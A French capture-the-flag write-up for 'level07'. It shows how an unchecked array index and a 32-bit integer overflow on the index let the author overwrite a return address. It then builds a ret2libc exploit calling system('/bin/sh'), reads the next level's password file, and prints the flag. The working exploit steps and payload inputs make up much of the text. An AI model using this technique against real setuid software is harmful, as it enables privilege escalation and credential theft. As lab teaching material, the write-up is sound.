# Level07

## Etape 1: Analyser le programme

On execute le programme

```
./level07
```

Le programme propose 3 commandes
- store: ecrire un nombre a un index
- read: lire un nombre a un index  
- quit: quitter

On teste

```
Input command: store
 Number: 42
 Index: 5
 Completed store command successfully

Input command: read
 Index: 5
 Number at data[5] is 42
```

## Etape 2: Trouver la faille

En regardant le code decompile on voit

```c
int32_t buffer[100];
buffer[index] = number;
```

Le programme ne verifie pas si index est inferieur a 100

On peut ecrire nimporte ou en memoire

## Etape 3: Comprendre lobjectif

Quand une fonction se termine elle doit savoir ou retourner dans le programme

Cette information est stockee sur la pile memoire

Si on modifie cette adresse de retour on peut rediriger le programme vers system("/bin/sh") au lieu de terminer normalement

Le programme level07 sexecute avec les droits de level08 donc le shell aura ces droits

## Etape 4: Chercher ou est ladresse de retour

On va tester des index pour trouver lequel modifie ladresse de retour

On utilise 1094795585 comme valeur test car en hexadecimal ca fait 0x41414141 soit "AAAA" facile a reconnaitre

```
gdb ./level07
```

On met un point darret juste avant que le programme ne se termine

```
(gdb) disas main
```

On cherche linstruction ret a la fin elle est a 0x080489f1

```
(gdb) b *0x080489f1
(gdb) run
```

On teste lindex 110

```bash
Input command: store
 Number: 1094795585 # (ca fait 0x41414141 soit "AAAA")
 Index: 110
 Completed store command successfully
Input command: quit
```

On verifie ladresse de retour

```
(gdb) x/x $esp
0xffffd66c: 0x00000000
```

Pas modifie on continue avec 111 112 113 puis 114

```bash
(gdb) run

Input command: store
 Number: 1094795585 # (ca fait 0x41414141 soit "AAAA")
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
```

Lindex 114 declenche une erreur cest donc un index special

## Etape 5: Comprendre les protections

Le code contient deux verifications

```c
if (!(index % 3) || number >> 0x18 != 0xb7) {
    puts(" *** ERROR! ***");
    return 1;
}
```

Protection 1: lindex ne doit pas etre divisible par 3

114 divise par 3 donne 0 de reste donc il est bloque

Protection 2: les 8 premiers bits du nombre doivent valoir 0xb7

Cela empeche dinjeter du code classique

## Etape 6: Calculer pourquoi 114

Un entier occupe 4 octets en memoire

Quand on ecrit buffer[index] le programme calcule

```
adresse = debut_du_buffer + (index × 4)
```

En analysant la pile avec le debugger on trouve que ladresse de retour est a 456 octets du debut du buffer

```
456 ÷ 4 = 114
```

Donc buffer[114] pointe exactement sur ladresse de retour

## Etape 7: Contourner la protection avec un debordement

Les nombres sur 32 bits vont de 0 a 4294967295

Si on utilise un nombre tellement grand qu'apres multiplication par 4 il deborde on peut atteindre lindex 114

Calcul

```
4294967296 ÷ 4 = 1073741824
1073741824 + 114 = 1073741938
```

Verification

```
1073741938 % 3 = 2
```

Pas divisible par 3 ca passe

Lors de la multiplication

```
1073741938 × 4 = 4294967752
```

Ce nombre est trop grand pour 32 bits

L'ordinateur garde seulement les 32 bits de droite ce qui donne 456 octets

Test:

```bash
(gdb) run

Input command: store
 Number: 1094795585 # ca fait 0x41414141 soit "AAAA"
 Index: 1073741938 # (1073741824 + 114)
 Completed store command successfully
Input command: quit

(gdb) x/x $esp
0xffffd66c: 0x41414141
```

On controle ladresse de retour

## Etape 8: Trouver les adresses necessaires

Au lieu dinjecter notre code on va utiliser une fonction deja presente en memoire: system()

On lance le debugger

```
gdb ./level07
```

```bash
(gdb) break main
(gdb) run
(gdb) p system
$1 = 0xf7e6aed0 <system> 
```

Adresse de system: 0xf7e6aed0

On cherche la chaine "/bin/sh" en memoire

```bash
(gdb) find &system, +9999999, "/bin/sh"
0xf7f897ec
```

Adresse de "/bin/sh": 0xf7f897ec

## Etape 9: Convertir en decimal

Le programme attend des nombres en decimal

```bash
python -c "print(0xf7e6aed0)" # system addr
4159090384

python -c "print(0xf7f897ec)" # "/bin/sh" addr
4160264172
```

## Etape 10: Organiser la pile memoire

Quand une fonction est appelee la pile contient

```
[Adresse de la fonction]
[Adresse de retour]
[Argument 1]
```

Pour appeler system("/bin/sh") on doit ecrire

```
Index 114: 4159090384  (system)
Index 115: [garbage]
Index 116: 4160264172  ("/bin/sh")
```

On saute lindex 115 car on na pas besoin de controler ou system retourne

## Etape 11: Creer lexploit

```
cat > /tmp/exploit07 << 'EOF'
store
4159090384
1073741938
store
4160264172
116
quit
EOF
```

## Etape 12: Executer l'exploit

```
cat /tmp/exploit07 - | ./level07
```

Le tiret garde l'entree standard ouverte

```
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command: whoami
level08
cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

FLAG: 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC